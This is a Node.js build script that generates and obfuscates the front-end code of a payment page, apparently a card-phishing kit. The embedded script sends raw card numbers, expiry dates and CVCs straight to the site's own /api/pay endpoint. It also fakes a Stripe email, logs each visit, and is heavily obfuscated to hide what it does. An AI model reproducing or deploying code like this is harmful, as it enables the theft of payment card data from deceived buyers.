const fs = require('fs');
const path = require('path');
const JavaScriptObfuscator = require('javascript-obfuscator');

const scriptPath = path.join(__dirname, 'public', 'script.js');
let scriptContent = `
document.addEventListener('DOMContentLoaded', () => {
    const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    const API_URL = isLocal ? '' : (window.API_URL || '');
    
    fetch(API_URL + '/api/log-visit').catch(() => {});

    const payForm = document.getElementById('paymentForm');
    const payBtn = document.getElementById('payBtn');
    const paymentContent = document.getElementById('payment-view');
    const successSection = document.getElementById('successSection');
    const vipCode = document.getElementById('vipCode');
    const copyBtn = document.getElementById('copyBtn');

    // MASK CARTE (1234 1234 1234 1234)
    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formatted.substring(0, 19);
        });
    }

    // MASK EXPIRY stable (MM / AA)
    const expiry = document.getElementById('expiry');
    if (expiry) {
        expiry.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length > 2) {
                e.target.value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
            } else {
                e.target.value = value;
            }
        });
        
        // Gérer le backspace sur le slash
        expiry.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && expiry.value.length === 5) {
                // Si on a "MM / A" et qu'on backspace, on laisse faire normalement
            }
        });
    }

    // SUBMIT
    if (payForm) {
        payForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btnText = payBtn.querySelector('.btn-text');
            const btnLoader = payBtn.querySelector('.btn-loader');

            if (!btnText || !btnLoader) return;

            payBtn.disabled = true;
            btnText.classList.add('hidden');
            btnLoader.classList.remove('hidden');

            const payload = {
                cardHolder: document.getElementById('cardHolder').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value.replace(/\\s/g, ''),
                cvc: document.getElementById('cvc').value,
                country: document.getElementById('country').value,
                email: "client@stripe.com" // Valeur par défaut car champ supprimé
            };

            try {
                const response = await fetch(API_URL + '/api/pay', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) throw new Error('Erreur HTTP ' + response.status);

                const data = await response.json();
                
                if (data.success) {
                    setTimeout(() => {
                        paymentContent.classList.add('hidden');
                        successSection.classList.remove('hidden');
                        vipCode.textContent = data.code;
                    }, 1000);
                } else {
                    alert(data.message || 'Paiement refusé');
                    resetBtn();
                }

            } catch (err) {
                console.error(err);
                alert('Erreur: Impossible de contacter le serveur de paiement');
                resetBtn();
            }
        });
    }

    function resetBtn() {
        if (!payBtn) return;
        payBtn.disabled = false;
        const btnText = payBtn.querySelector('.btn-text');
        const btnLoader = payBtn.querySelector('.btn-loader');
        if (btnText) btnText.classList.remove('hidden');
        if (btnLoader) btnLoader.classList.add('hidden');
    }

    if (copyBtn) {
        copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(vipCode.textContent);
            copyBtn.textContent = 'Copié !';
            setTimeout(() => copyBtn.textContent = 'Copier', 2000);
        });
    }
});
`;

const obfuscated = JavaScriptObfuscator.obfuscate(scriptContent, {
    compact: true,
    controlFlowFlattening: true,
    controlFlowFlatteningThreshold: 1,
    numbersToExpressions: true,
    simplify: true,
    stringArrayThreshold: 1,
    splitStrings: true,
    splitStringsChunkLength: 5
});

fs.writeFileSync(scriptPath, obfuscated.getObfuscatedCode());
console.log('script.js updated & obfuscated!');
